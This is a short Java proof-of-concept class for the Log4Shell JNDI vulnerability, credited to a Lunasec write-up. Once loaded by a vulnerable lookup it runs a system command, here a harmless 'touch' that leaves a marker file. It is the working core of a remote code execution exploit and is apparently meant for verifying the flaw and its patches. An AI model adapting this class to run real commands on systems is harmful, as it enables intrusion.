// Example exploit Java Code (shameless stolen from the Lunasec write-up)
// https://www.lunasec.io/docs/blog/log4shell-live-patch-technical 
import java.io.File;
import java.io.IOException;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.*;
import java.util.Hashtable;
import java.util.Map;



public class Exploit implements ObjectFactory {
	// the getObjectInstance method gets called immediately 
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment){
                
                String[] cmdarray = {"touch", "the_exploit_worked"};
                try {
                        Runtime.getRuntime().exec(cmdarray);
                } catch (IOException ex) {
                        ex.printStackTrace();
                        return "Error with Exploit Class";
                }
                return "Payload Executed!";
        }

}
